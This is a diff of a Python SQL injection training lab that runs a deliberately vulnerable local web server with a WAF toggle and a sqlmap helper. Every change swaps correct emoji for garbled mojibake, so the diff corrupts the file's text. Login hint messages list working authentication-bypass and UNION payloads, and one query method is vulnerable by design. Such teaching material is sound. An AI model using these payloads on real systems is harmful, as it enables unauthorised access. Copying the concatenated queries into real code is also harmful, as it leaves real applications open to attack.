@@ -2542,7 +2542,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
         <body>
             <div class="container">
                 <div class="header">
-                    <h1>🛡️ User Dashboard</h1>
+                    <h1>ðŸ›¡ï¸ User Dashboard</h1>
                     <p class="subtitle">Welcome, <strong>{username}</strong>! ({user['role']})</p>
                     <p class="subtitle" style="font-size:0.8em;color:#666;">{user['email']} | {user['department']}</p>
                 </div>
@@ -2561,7 +2561,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                 
                 <div class="dashboard-content">
                     <div class="waf-status-banner">
-                        <h3>🛡️ WAF Status: {waf_status_text}</h3>
+                        <h3>ðŸ›¡ï¸ WAF Status: {waf_status_text}</h3>
                         <p style="color:#c9d1d9;">Web Application Firewall is {'ACTIVE and blocking injection attempts' if waf_mode else 'DISABLED - injection attempts will reach the application'}</p>
                         <div class="control-buttons">
                             <button onclick="location.href='/waf-toggle?mode={waf_toggle_mode}'" class="{waf_toggle_class}">
@@ -2580,35 +2580,35 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                             </button>
                         </div>
                         <div class="query-display">
-                            <div class="query-label">📝 Current Query Method:</div>
+                            <div class="query-label">ðŸ“ Current Query Method:</div>
                             <code>{'Parameterized Query (Secure)' if secure_mode else 'String Concatenation (Vulnerable)'}</code>
                             <div style="margin-top: 10px; font-size: 12px; color: #666;">
-                                {'✅ SQL injection is blocked' if secure_mode else '⚠️ SQL injection is possible'}
+                                {'âœ… SQL injection is blocked' if secure_mode else 'âš ï¸ SQL injection is possible'}
                             </div>
                         </div>
                     </div>
                     
                     <div class="stats-grid">
                         <div class="stat-card">
-                            <h3>📦 My Products</h3>
+                            <h3>ðŸ“¦ My Products</h3>
                             <div class="stat-number">{len(products)}</div>
                         </div>
                         <div class="stat-card">
-                            <h3>🛒 Total Orders</h3>
+                            <h3>ðŸ›’ Total Orders</h3>
                             <div class="stat-number">{total_orders}</div>
                         </div>
                         <div class="stat-card">
-                            <h3>💰 Total Spent</h3>
+                            <h3>ðŸ’° Total Spent</h3>
                             <div class="stat-number">${total_spent:.2f}</div>
                         </div>
                         <div class="stat-card">
-                            <h3>⏳ Pending Orders</h3>
+                            <h3>â³ Pending Orders</h3>
                             <div class="stat-number">{pending_orders}</div>
                         </div>
                     </div>
                     
                     <div class="admin-section">
-                        <h3>🔑 Admin Controls</h3>
+                        <h3>ðŸ”‘ Admin Controls</h3>
                         <p>Change admin credentials:</p>
                         <form method="POST" action="/update_credentials">
                             <div class="form-group inline">
@@ -2620,20 +2620,20 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                     </div>
                     
                     <div class="lab-section">
-                        <h3>🧪 Lab Controls</h3>
+                        <h3>ðŸ§ª Lab Controls</h3>
                         <div class="lab-controls">
-                            <button onclick="location.href='/secure_login?mode=enable'" class="btn-secure" style="{'display: none;' if secure_mode else ''}">🔒 Enable Secure Mode</button>
-                            <button onclick="location.href='/secure_login?mode=disable'" class="btn-vulnerable" style="{'display: none;' if not secure_mode else ''}">🔓 Disable Secure Mode</button>
-                            <button onclick="if(confirm('Reset database to initial state?')) location.href='/reset'" class="btn-reset">🔄 Reset Database</button>
-                            <button onclick="location.href='/techniques'" class="btn-learning">📚 View Techniques</button>
-                            <button onclick="location.href='/second-order'" class="btn-second-order">🔄 Second-Order Lab</button>
-                            <button onclick="location.href='/download-pdf'" class="btn-pdf">📄 Download PDF Notes</button>
+                            <button onclick="location.href='/secure_login?mode=enable'" class="btn-secure" style="{'display: none;' if secure_mode else ''}">ðŸ”’ Enable Secure Mode</button>
+                            <button onclick="location.href='/secure_login?mode=disable'" class="btn-vulnerable" style="{'display: none;' if not secure_mode else ''}">ðŸ”“ Disable Secure Mode</button>
+                            <button onclick="if(confirm('Reset database to initial state?')) location.href='/reset'" class="btn-reset">ðŸ”„ Reset Database</button>
+                            <button onclick="location.href='/techniques'" class="btn-learning">ðŸ“š View Techniques</button>
+                            <button onclick="location.href='/second-order'" class="btn-second-order">ðŸ”„ Second-Order Lab</button>
+                            <button onclick="location.href='/download-pdf'" class="btn-pdf">ðŸ“„ Download PDF Notes</button>
                         </div>
                     </div>
                 </div>
                 
                 <div class="footer">
-                    <p>⚠️ Educational Use Only | DSTERMINAL Enterprise Edition v4.0</p>
+                    <p>âš ï¸ Educational Use Only | DSTERMINAL Enterprise Edition v4.0</p>
                     <p style="font-size:0.7em;color:#444;margin-top:5px;">
                         For more info: <a href="mailto:starkec.team@outlook.com" style="color:#00ffff;">starkec.team@outlook.com</a> | 
                         <a href="mailto:info@starkteamsupport.mw" style="color:#00ffff;">info@starkteamsupport.mw</a>
@@ -2677,7 +2677,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
         <body>
             <div class="container">
                 <div class="header">
-                    <h1>📦 My Products</h1>
+                    <h1>ðŸ“¦ My Products</h1>
                     <p class="subtitle">Products owned by """ + username + """</p>
                 </div>
                 
@@ -2701,7 +2701,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
             html += "<table class='product-table'>"
             html += "<tr><th>ID</th><th>Name</th><th>Price</th><th>Description</th><th>Stock</th><th>Category</th><th>Sub-Category</th><th>Featured</th></tr>"
             for product in products:
-                featured = "⭐ Yes" if product['is_featured'] else "No"
+                featured = "â­ Yes" if product['is_featured'] else "No"
                 html += f"<tr><td>{product['id']}</td><td>{product['name']}</td><td>${product['price']}</td><td>{product['description']}</td><td>{product['stock']}</td><td>{product['category']}</td><td>{product['sub_category']}</td><td>{featured}</td></tr>"
             html += "</table>"
         else:
@@ -2712,7 +2712,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                 </div>
                 
                 <div class="footer">
-                    <p>⚠️ Educational Use Only | DSTERMINAL Enterprise Edition v4.0</p>
+                    <p>âš ï¸ Educational Use Only | DSTERMINAL Enterprise Edition v4.0</p>
                     <p style="font-size:0.7em;color:#444;margin-top:5px;">
                         For more info: <a href="mailto:starkec.team@outlook.com" style="color:#00ffff;">starkec.team@outlook.com</a> | 
                         <a href="mailto:info@starkteamsupport.mw" style="color:#00ffff;">info@starkteamsupport.mw</a>
@@ -2744,7 +2744,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
         <body>
             <div class="container">
                 <div class="header">
-                    <h1>📦 All Products</h1>
+                    <h1>ðŸ“¦ All Products</h1>
                     <p class="subtitle">Products across all users</p>
                 </div>
                 
@@ -2768,7 +2768,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
             html += "<table class='product-table'>"
             html += "<tr><th>ID</th><th>Name</th><th>Price</th><th>Description</th><th>Stock</th><th>Category</th><th>Sub-Category</th><th>Featured</th><th>Owner</th></tr>"
             for product in products:
-                featured = "⭐ Yes" if product['is_featured'] else "No"
+                featured = "â­ Yes" if product['is_featured'] else "No"
                 html += f"<tr><td>{product['id']}</td><td>{product['name']}</td><td>${product['price']}</td><td>{product['description']}</td><td>{product['stock']}</td><td>{product['category']}</td><td>{product['sub_category']}</td><td>{featured}</td><td>{product['owner']}</td></tr>"
             html += "</table>"
         else:
@@ -2779,7 +2779,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                 </div>
                 
                 <div class="footer">
-                    <p>⚠️ Educational Use Only | DSTERMINAL Enterprise Edition v4.0</p>
+                    <p>âš ï¸ Educational Use Only | DSTERMINAL Enterprise Edition v4.0</p>
                     <p style="font-size:0.7em;color:#444;margin-top:5px;">
                         For more info: <a href="mailto:starkec.team@outlook.com" style="color:#00ffff;">starkec.team@outlook.com</a> | 
                         <a href="mailto:info@starkteamsupport.mw" style="color:#00ffff;">info@starkteamsupport.mw</a>
@@ -2811,7 +2811,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
         <body>
             <div class="container">
                 <div class="header">
-                    <h1>👥 Users</h1>
+                    <h1>ðŸ‘¥ Users</h1>
                     <p class="subtitle">All registered users</p>
                 </div>
                 
@@ -2842,7 +2842,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                 </div>
                 
                 <div class="footer">
-                    <p>⚠️ Educational Use Only | DSTERMINAL Enterprise Edition v4.0</p>
+                    <p>âš ï¸ Educational Use Only | DSTERMINAL Enterprise Edition v4.0</p>
                     <p style="font-size:0.7em;color:#444;margin-top:5px;">
                         For more info: <a href="mailto:starkec.team@outlook.com" style="color:#00ffff;">starkec.team@outlook.com</a> | 
                         <a href="mailto:info@starkteamsupport.mw" style="color:#00ffff;">info@starkteamsupport.mw</a>
@@ -2873,7 +2873,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
         <body>
             <div class="container">
                 <div class="header">
-                    <h1>📊 Audit Logs</h1>
+                    <h1>ðŸ“Š Audit Logs</h1>
                 </div>
                 
                 <div class="nav-bar">
@@ -2903,7 +2903,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                 </div>
                 
                 <div class="footer">
-                    <p>⚠️ Educational Use Only | DSTERMINAL Enterprise Edition v4.0</p>
+                    <p>âš ï¸ Educational Use Only | DSTERMINAL Enterprise Edition v4.0</p>
                     <p style="font-size:0.7em;color:#444;margin-top:5px;">
                         For more info: <a href="mailto:starkec.team@outlook.com" style="color:#00ffff;">starkec.team@outlook.com</a> | 
                         <a href="mailto:info@starkteamsupport.mw" style="color:#00ffff;">info@starkteamsupport.mw</a>
@@ -2935,7 +2935,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
         <body>
             <div class="container">
                 <div class="header">
-                    <h1>📊 Injection History</h1>
+                    <h1>ðŸ“Š Injection History</h1>
                     <p class="subtitle">Record of all SQL injection attempts with WAF detection</p>
                 </div>
                 
@@ -2970,8 +2970,8 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
             """
             for attempt in attempts:
                 success_class = "success-badge" if attempt['success'] else "fail-badge"
-                success_text = "✅ Yes" if attempt['success'] else "❌ No"
-                waf_text = "🛡️ Yes" if attempt['waf_blocked'] else "❌ No"
+                success_text = "âœ… Yes" if attempt['success'] else "âŒ No"
+                waf_text = "ðŸ›¡ï¸ Yes" if attempt['waf_blocked'] else "âŒ No"
                 html += f"""
                 <tr>
                     <td><span class="tech-badge">{attempt['technique']}</span></td>
@@ -2992,7 +2992,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                 </div>
                 
                 <div class="footer">
-                    <p>⚠️ Educational Use Only | DSTERMINAL Enterprise Edition v4.0</p>
+                    <p>âš ï¸ Educational Use Only | DSTERMINAL Enterprise Edition v4.0</p>
                     <p style="font-size:0.7em;color:#444;margin-top:5px;">
                         For more info: <a href="mailto:starkec.team@outlook.com" style="color:#00ffff;">starkec.team@outlook.com</a> | 
                         <a href="mailto:info@starkteamsupport.mw" style="color:#00ffff;">info@starkteamsupport.mw</a>
@@ -3199,14 +3199,14 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
         <body>
             <div class="container">
                 <div class="header">
-                    <h1>💉 Advanced SQL Injection Techniques</h1>
+                    <h1>ðŸ’‰ Advanced SQL Injection Techniques</h1>
                     <p class="subtitle">Complete guide to modern SQL injection attack vectors with WAF bypass</p>
                     <div style="margin-top:10px;display:flex;gap:10px;justify-content:center;flex-wrap:wrap;">
                         <button onclick="location.href='/download-pdf'" class="pdf-download-btn" style="padding:10px 30px;background:linear-gradient(135deg,#ff8800,#ff5500);color:#fff;border:none;border-radius:10px;font-size:14px;font-weight:bold;cursor:pointer;">
-                            📄 Download PDF Notes
+                            ðŸ“„ Download PDF Notes
                         </button>
                         <button onclick="location.href='/second-order'" class="btn-second-order" style="padding:10px 30px;background:linear-gradient(135deg,#ffcc00,#ff8800);color:#0d1117;border:none;border-radius:10px;font-size:14px;font-weight:bold;cursor:pointer;">
-                            🔄 Second-Order Lab
+                            ðŸ”„ Second-Order Lab
                         </button>
                     </div>
                 </div>
@@ -3241,11 +3241,11 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                         <code>{tech_data['example']}</code>
                     </div>
                     <details class="tech-details">
-                        <summary>📖 How it works</summary>
+                        <summary>ðŸ“– How it works</summary>
                         <p>{tech_data['explanation']}</p>
                     </details>
                     <details class="tech-details">
-                        <summary>🛡️ WAF Bypass Payloads</summary>
+                        <summary>ðŸ›¡ï¸ WAF Bypass Payloads</summary>
                         <ul>
             """
             if 'waf_bypass_payloads' in tech_data:
@@ -3257,7 +3257,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                         </ul>
                     </details>
                     <details class="tech-details">
-                        <summary>🔍 Detection Indicators</summary>
+                        <summary>ðŸ” Detection Indicators</summary>
                         <ul>
             """
             if 'detection_indicators' in tech_data:
@@ -3267,7 +3267,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                         </ul>
                     </details>
                     <button onclick="location.href='/login'" class="test-btn" style="margin-top:15px;">
-                        🔄 Go to Login & Test
+                        ðŸ”„ Go to Login & Test
                     </button>
                 </div>
             </div>
@@ -3278,7 +3278,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                     </div>
                     
                     <div class="waf-section">
-                        <h2>🛡️ WAF Bypass Techniques</h2>
+                        <h2>ðŸ›¡ï¸ WAF Bypass Techniques</h2>
                         <div class="waf-grid">
         """
         
@@ -3311,7 +3311,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                 </div>
                 
                 <div class="footer">
-                    <p>⚠️ Educational Use Only | DSTERMINAL Enterprise Edition v4.0</p>
+                    <p>âš ï¸ Educational Use Only | DSTERMINAL Enterprise Edition v4.0</p>
                     <p style="font-size:0.7em;color:#444;margin-top:5px;">
                         For more info: <a href="mailto:starkec.team@outlook.com" style="color:#00ffff;">starkec.team@outlook.com</a> | 
                         <a href="mailto:info@starkteamsupport.mw" style="color:#00ffff;">info@starkteamsupport.mw</a>
@@ -3774,7 +3774,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
             lab.add_audit_log('test_user', f"WAF blocked injection attempt: {technique}", request_data=username[:100])
             
             self._serve_login_form(
-                error=f"🛡️ WAF blocked injection attempt!",
+                error=f"ðŸ›¡ï¸ WAF blocked injection attempt!",
                 message=f"Technique: {technique}\nYour payload was detected and blocked by the WAF."
             )
             return
@@ -3913,8 +3913,8 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                             return
                         
                         self._serve_login_form(
-                            error=f"💉 UNION injection detected! Column mismatch.",
-                            message=f"🔍 The users table has 8 columns.\n💡 Example: ' UNION SELECT 1,2,3,4,5,6,7,8 --\n✅ Try again with 8 columns!"
+                            error=f"ðŸ’‰ UNION injection detected! Column mismatch.",
+                            message=f"ðŸ” The users table has 8 columns.\nðŸ’¡ Example: ' UNION SELECT 1,2,3,4,5,6,7,8 --\nâœ… Try again with 8 columns!"
                         )
                         return
                 
@@ -3945,8 +3945,8 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                             return
                         
                         self._serve_login_form(
-                            error=f"💉 {technique.replace('_', ' ').title()} detected!",
-                            message=f"💡 Try these OR/AND bypass payloads:\n   • ' OR '1'='1' --\n   • ' OR 1=1 --\n   • ' OR 'x'='x\n   • admin' --\n   • ' OR 'x'='x' --"
+                            error=f"ðŸ’‰ {technique.replace('_', ' ').title()} detected!",
+                            message=f"ðŸ’¡ Try these OR/AND bypass payloads:\n   â€¢ ' OR '1'='1' --\n   â€¢ ' OR 1=1 --\n   â€¢ ' OR 'x'='x\n   â€¢ admin' --\n   â€¢ ' OR 'x'='x' --"
                         )
                         return
                 
@@ -3975,8 +3975,8 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                             return
                         
                         self._serve_login_form(
-                            error=f"⏱️ Time-based injection detected! Technique: {technique}",
-                            message=f"💡 The database executed your time-based payload.\n📝 Payload: {username[:100]}"
+                            error=f"â±ï¸ Time-based injection detected! Technique: {technique}",
+                            message=f"ðŸ’¡ The database executed your time-based payload.\nðŸ“ Payload: {username[:100]}"
                         )
                         return
                 
@@ -4005,8 +4005,8 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                             return
                         
                         self._serve_login_form(
-                            error=f"🗄️ Stacked query injection detected! Technique: {technique}",
-                            message=f"💡 The database executed your stacked query.\n📝 Payload: {username[:100]}"
+                            error=f"ðŸ—„ï¸ Stacked query injection detected! Technique: {technique}",
+                            message=f"ðŸ’¡ The database executed your stacked query.\nðŸ“ Payload: {username[:100]}"
                         )
                         return
                 
@@ -4021,8 +4021,8 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                         lab.add_audit_log('test_user', f"Boolean-based injection attempted: {technique}", request_data=username[:100])
                         
                         self._serve_login_form(
-                            error=f"🔍 Boolean-based injection detected! Technique: {technique}",
-                            message=f"💡 Check if application responds differently to '1=1' vs '1=2'.\n📝 Payload: {username[:100]}"
+                            error=f"ðŸ” Boolean-based injection detected! Technique: {technique}",
+                            message=f"ðŸ’¡ Check if application responds differently to '1=1' vs '1=2'.\nðŸ“ Payload: {username[:100]}"
                         )
                         return
                 
@@ -4051,8 +4051,8 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                         return
                     
                     self._serve_login_form(
-                        error=f"⚠️ Injection attempt detected but failed! Technique: {technique}",
-                        message=f"💡 Try different payloads or check if secure mode is enabled."
+                        error=f"âš ï¸ Injection attempt detected but failed! Technique: {technique}",
+                        message=f"ðŸ’¡ Try different payloads or check if secure mode is enabled."
                     )
                     return
         
@@ -4095,7 +4095,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
             technique = lab.detect_technique(username)
             lab.log_injection_attempt(technique, username, username, success=False, waf_blocked=False, response_time=response_time)
             lab.add_audit_log(username, f"Injection attempt failed: {technique}", request_data=username[:100])
-            self._serve_login_form(error=f"⚠️ Injection attempt detected but failed! Technique: {technique}")
+            self._serve_login_form(error=f"âš ï¸ Injection attempt detected but failed! Technique: {technique}")
             return
         
         lab.add_audit_log(username, "Login failed", request_data=f"username={username}")
@@ -4139,14 +4139,14 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                                     lab.log_injection_attempt('second_order', stored_payload, 'test_user', success=True)
                                     html = f"""
                                     <div style="color:#00ff88;">
-                                        <h3>✅ Second-Order Injection Successful!</h3>
+                                        <h3>âœ… Second-Order Injection Successful!</h3>
                                         <p>The stored payload <code style="background:#1a1a2e;padding:2px 8px;border-radius:3px;color:#ffcc00;">{stored_payload}</code> was executed successfully!</p>
                                         <div style="margin-top:10px;padding:10px;background:#0d1117;border-radius:5px;border:1px solid #00ff8844;">
                                             <p style="color:#c9d1d9;font-size:13px;">The stored injection worked because the application used the stored data in a vulnerable query.</p>
                                             <code style="display:block;padding:8px;background:#1a1a2e;border-radius:3px;color:#00ff88;font-size:12px;margin-top:5px;">{query}</code>
                                         </div>
                                         <div style="margin-top:10px;padding:10px;background:#0d1117;border-radius:5px;border:1px solid #ffcc0044;">
-                                            <p style="color:#ffcc00;font-size:13px;">💡 <strong>What happened:</strong> The payload was stored in the database and executed later when retrieved.</p>
+                                            <p style="color:#ffcc00;font-size:13px;">ðŸ’¡ <strong>What happened:</strong> The payload was stored in the database and executed later when retrieved.</p>
                                         </div>
                                     </div>
                                     """
@@ -4172,7 +4172,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                     lab.log_injection_attempt(technique, payload, 'test_user', success=True)
                     html = f"""
                     <div style="color:#00ff88;">
-                        <h3>✅ Injection Successful!</h3>
+                        <h3>âœ… Injection Successful!</h3>
                         <p>The payload <code style="background:#1a1a2e;padding:2px 8px;border-radius:3px;color:#ffcc00;">{payload}</code> successfully bypassed authentication!</p>
                         <p style="margin-top:10px;color:#888;">Technique: <span class="tech-badge">{technique}</span></p>
                         <div style="margin-top:10px;padding:10px;background:#0d1117;border-radius:5px;border:1px solid #00ff8844;">
@@ -4180,30 +4180,30 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                             <code style="display:block;padding:8px;background:#1a1a2e;border-radius:3px;color:#00ff88;font-size:12px;margin-top:5px;">{query}</code>
                         </div>
                         <div style="margin-top:10px;padding:10px;background:#0d1117;border-radius:5px;border:1px solid #ffcc0044;">
-                            <p style="color:#ffcc00;font-size:13px;">💡 <strong>What happened:</strong> The OR condition made the WHERE clause always TRUE, and the -- commented out the password check.</p>
+                            <p style="color:#ffcc00;font-size:13px;">ðŸ’¡ <strong>What happened:</strong> The OR condition made the WHERE clause always TRUE, and the -- commented out the password check.</p>
                         </div>
-                        <button onclick="location.href='/login'" style="margin-top:15px;padding:8px 20px;background:#00ffff;color:#0d1117;border:none;border-radius:5px;cursor:pointer;font-weight:bold;width:auto;">🔐 Go to Login</button>
-                        <button onclick="location.href='/download-pdf'" style="margin-top:15px;padding:8px 20px;background:linear-gradient(135deg,#ff8800,#ff5500);color:#fff;border:none;border-radius:5px;cursor:pointer;font-weight:bold;width:auto;margin-left:10px;">📄 Download PDF Notes</button>
+                        <button onclick="location.href='/login'" style="margin-top:15px;padding:8px 20px;background:#00ffff;color:#0d1117;border:none;border-radius:5px;cursor:pointer;font-weight:bold;width:auto;">ðŸ” Go to Login</button>
+                        <button onclick="location.href='/download-pdf'" style="margin-top:15px;padding:8px 20px;background:linear-gradient(135deg,#ff8800,#ff5500);color:#fff;border:none;border-radius:5px;cursor:pointer;font-weight:bold;width:auto;margin-left:10px;">ðŸ“„ Download PDF Notes</button>
                     </div>
                     """
                 else:
                     lab.log_injection_attempt(technique, payload, 'test_user', success=False)
                     html = f"""
                     <div style="color:#ff5555;">
-                        <h3>❌ Injection Failed</h3>
+                        <h3>âŒ Injection Failed</h3>
                         <p>The payload <code style="background:#1a1a2e;padding:2px 8px;border-radius:3px;color:#ffcc00;">{payload}</code> did not bypass authentication.</p>
                         <p style="margin-top:10px;color:#888;">Technique: <span class="tech-badge">{technique}</span></p>
                         <div style="margin-top:10px;padding:10px;background:#0d1117;border-radius:5px;border:1px solid #ff555544;">
                             <p style="color:#c9d1d9;font-size:13px;">The injection did not work because:</p>
                             <ul style="list-style:none;padding:0;margin-top:5px;">
-                                <li style="padding:3px 0;">• The application may be using parameterized queries</li>
-                                <li style="padding:3px 0;">• The payload syntax may be incorrect for this database</li>
-                                <li style="padding:3px 0;">• Secure mode may be enabled</li>
-                                <li style="padding:3px 0;">• WAF may have blocked the request</li>
+                                <li style="padding:3px 0;">â€¢ The application may be using parameterized queries</li>
+                                <li style="padding:3px 0;">â€¢ The payload syntax may be incorrect for this database</li>
+                                <li style="padding:3px 0;">â€¢ Secure mode may be enabled</li>
+                                <li style="padding:3px 0;">â€¢ WAF may have blocked the request</li>
                             </ul>
                         </div>
-                        <button onclick="location.href='/login'" style="margin-top:15px;padding:8px 20px;background:#00ffff;color:#0d1117;border:none;border-radius:5px;cursor:pointer;font-weight:bold;width:auto;">🔐 Go to Login</button>
-                        <button onclick="location.href='/download-pdf'" style="margin-top:15px;padding:8px 20px;background:linear-gradient(135deg,#ff8800,#ff5500);color:#fff;border:none;border-radius:5px;cursor:pointer;font-weight:bold;width:auto;margin-left:10px;">📄 Download PDF Notes</button>
+                        <button onclick="location.href='/login'" style="margin-top:15px;padding:8px 20px;background:#00ffff;color:#0d1117;border:none;border-radius:5px;cursor:pointer;font-weight:bold;width:auto;">ðŸ” Go to Login</button>
+                        <button onclick="location.href='/download-pdf'" style="margin-top:15px;padding:8px 20px;background:linear-gradient(135deg,#ff8800,#ff5500);color:#fff;border:none;border-radius:5px;cursor:pointer;font-weight:bold;width:auto;margin-left:10px;">ðŸ“„ Download PDF Notes</button>
                     </div>
                     """
             else:
@@ -4281,7 +4281,7 @@ class EnhancedSQLMapScanner:
         sqlmap_path = which("sqlmap")
         if sqlmap_path:
             if self.verbose and self.console:
-                self.console.print(f"[green]✅ Found SQLMap in PATH: {sqlmap_path}[/green]")
+                self.console.print(f"[green]âœ… Found SQLMap in PATH: {sqlmap_path}[/green]")
             return [sqlmap_path], False
         
         common_paths = [
@@ -4295,28 +4295,28 @@ class EnhancedSQLMapScanner:
         for path in common_paths:
             if os.path.exists(path):
                 if self.verbose and self.console:
-                    self.console.print(f"[green]✅ Found SQLMap at: {path}[/green]")
+                    self.console.print(f"[green]âœ… Found SQLMap at: {path}[/green]")
                 return [path], False
         
         if self.console:
-            self.console.print("[red]❌ SQLMap not found![/red]")
-            self.console.print("[yellow]💡 Try installing: pip install sqlmap[/yellow]")
-            self.console.print("[yellow]💡 Or download from: https://sqlmap.org/[/yellow]")
+            self.console.print("[red]âŒ SQLMap not found![/red]")
+            self.console.print("[yellow]ðŸ’¡ Try installing: pip install sqlmap[/yellow]")
+            self.console.print("[yellow]ðŸ’¡ Or download from: https://sqlmap.org/[/yellow]")
         return [], False
     
     def install_sqlmap(self):
         """Install SQLMap via pip"""
         if self.console:
-            self.console.print("[yellow]📦 Installing SQLMap...[/yellow]")
+            self.console.print("[yellow]ðŸ“¦ Installing SQLMap...[/yellow]")
         try:
             subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "sqlmap"])
             if self.console:
-                self.console.print("[green]✅ SQLMap installed successfully![/green]")
+                self.console.print("[green]âœ… SQLMap installed successfully![/green]")
                 self.sqlmap_cmd, self.use_bundled = self._locate_sqlmap()
             return True
         except Exception as e:
             if self.console:
-                self.console.print(f"[red]❌ Installation failed: {e}[/red]")
+                self.console.print(f"[red]âŒ Installation failed: {e}[/red]")
             return False
     
     def start_lab(self, port: int = 8080, open_browser: bool = True):
@@ -4326,13 +4326,13 @@ class EnhancedSQLMapScanner:
             return
         
         if self.lab.running:
-            self.console.print(f"[yellow]⚠️ Lab is already running on http://localhost:{self.lab.port}[/yellow]")
+            self.console.print(f"[yellow]âš ï¸ Lab is already running on http://localhost:{self.lab.port}[/yellow]")
             return
         
-        self.console.print("\n[bold cyan]🔐 Starting Advanced SQL Injection Learning Lab...[/bold cyan]")
+        self.console.print("\n[bold cyan]ðŸ” Starting Advanced SQL Injection Learning Lab...[/bold cyan]")
         self.console.print(f"[dim]Server running on: http://localhost:{port}[/dim]")
         self.console.print("[dim]Use 'advanced-sqllab-stop' to stop the server[/dim]")
-        self.console.print("[dim]⏳ Initializing server...[/dim]")
+        self.console.print("[dim]â³ Initializing server...[/dim]")
         
         EnhancedLabHTTPHandler.lab_instance = self.lab
         
@@ -4342,7 +4342,7 @@ class EnhancedSQLMapScanner:
             self.lab.port = port
             self.lab.running = True
         except Exception as e:
-            self.console.print(f"[red]❌ Failed to start server: {e}[/red]")
+            self.console.print(f"[red]âŒ Failed to start server: {e}[/red]")
             return
         
         def run_server():
@@ -4362,20 +4362,20 @@ class EnhancedSQLMapScanner:
         
         if open_browser:
             try:
-                self.console.print("[green]✅ Opening browser...[/green]")
+                self.console.print("[green]âœ… Opening browser...[/green]")
                 def open_browser_later():
                     time.sleep(0.5)
                     webbrowser.open(f"http://localhost:{port}")
                 
                 browser_thread = threading.Thread(target=open_browser_later, daemon=True)
                 browser_thread.start()
-                self.console.print("[green]✅ Browser should open shortly[/green]")
+                self.console.print("[green]âœ… Browser should open shortly[/green]")
             except Exception as e:
                 self.console.print(f"[dim]Could not open browser: {e}[/dim]")
-                self.console.print(f"[cyan]🌐 Please open manually: http://localhost:{port}[/cyan]")
+                self.console.print(f"[cyan]ðŸŒ Please open manually: http://localhost:{port}[/cyan]")
         
-        self.console.print("[green]✅ Advanced Lab started successfully![/green]")
-        self.console.print(f"[cyan]🌐 http://localhost:{port}[/cyan]")
+        self.console.print("[green]âœ… Advanced Lab started successfully![/green]")
+        self.console.print(f"[cyan]ðŸŒ http://localhost:{port}[/cyan]")
         self.console.print("[dim]Use 'advanced-sqllab-status' to check status[/dim]")
         self.console.print("[dim]Use 'advanced-sqllab-stop' to stop the server[/dim]")
     
@@ -4383,21 +4383,21 @@ class EnhancedSQLMapScanner:
         """Stop the enhanced SQL Injection Learning Lab"""
         if not self.lab.running or not self.lab.server:
             if self.console:
-                self.console.print("[yellow]⚠️ Lab is not running[/yellow]")
+                self.console.print("[yellow]âš ï¸ Lab is not running[/yellow]")
             return
         
         if self.console:
-            self.console.print("[yellow]🛑 Stopping Advanced SQL Injection Learning Lab...[/yellow]")
+            self.console.print("[yellow]ðŸ›‘ Stopping Advanced SQL Injection Learning Lab...[/yellow]")
         
         try:
             self.lab.server.shutdown()
             self.lab.server.server_close()
             self.lab.running = False
             if self.console:
-                self.console.print("[green]✅ Lab server stopped[/green]")
+                self.console.print("[green]âœ… Lab server stopped[/green]")
         except Exception as e:
             if self.console:
-                self.console.print(f"[red]❌ Error stopping server: {e}[/red]")
+                self.console.print(f"[red]âŒ Error stopping server: {e}[/red]")
     
     def _print_enhanced_lab_info(self):
         """Print enhanced lab information"""
@@ -4407,56 +4407,56 @@ class EnhancedSQLMapScanner:
         users = self.lab.get_users()
         
         info = f"""
-[bold green]📋 Advanced Lab Information:[/bold green]
+[bold green]ðŸ“‹ Advanced Lab Information:[/bold green]
 
-[bold yellow]🔐 Security Features:[/bold yellow]
-  • Secure Mode: {'ENABLED ✅' if self.lab.secure_mode else 'DISABLED ❌'}
-  • WAF Mode: {'ENABLED 🛡️' if self.lab.waf_mode else 'DISABLED 🔓'}
+[bold yellow]ðŸ” Security Features:[/bold yellow]
+  â€¢ Secure Mode: {'ENABLED âœ…' if self.lab.secure_mode else 'DISABLED âŒ'}
+  â€¢ WAF Mode: {'ENABLED ðŸ›¡ï¸' if self.lab.waf_mode else 'DISABLED ðŸ”“'}
 
-[bold yellow]👥 Available Users:[/bold yellow]
+[bold yellow]ðŸ‘¥ Available Users:[/bold yellow]
 """
         for user in users[:5]:
